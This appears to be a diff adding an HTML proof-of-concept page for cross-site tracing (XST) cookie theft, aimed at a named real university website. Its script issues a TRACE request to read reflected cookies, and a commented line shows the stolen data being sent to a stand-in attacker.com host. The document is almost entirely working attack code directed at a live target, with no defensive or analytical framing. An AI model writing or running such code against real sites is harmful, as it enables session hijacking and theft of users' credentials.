@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>XST Cookie Theft POC</title>
+</head>
+<body>
+    <h1>TRACE Method Cookie Theft POC</h1>
+    <p>Target: www.ou.edu (Apache 2.4.6)</p>
+    <p>Click button to attempt cookie theft via TRACE method</p>
+    
+    <button onclick="stealCookies()">Steal Cookies</button>
+    <pre id="result"></pre>
+    
+    <script>
+    function stealCookies() {
+        var xhr = new XMLHttpRequest();
+        xhr.open("TRACE", "https://www.ou.edu/", false);
+        xhr.send();
+        
+        var result = document.getElementById("result");
+        if (xhr.status === 200) {
+            result.textContent = "TRACE response (contains reflected cookies):\n" + xhr.responseText;
+            // In real attack, exfiltrate to attacker server:
+            // fetch("https://attacker.com/steal?data=" + encodeURIComponent(xhr.responseText));
+        } else {
+            result.textContent = "TRACE blocked (status: " + xhr.status + ")";
+        }
+    }
+    </script>
+</body>
+</html>
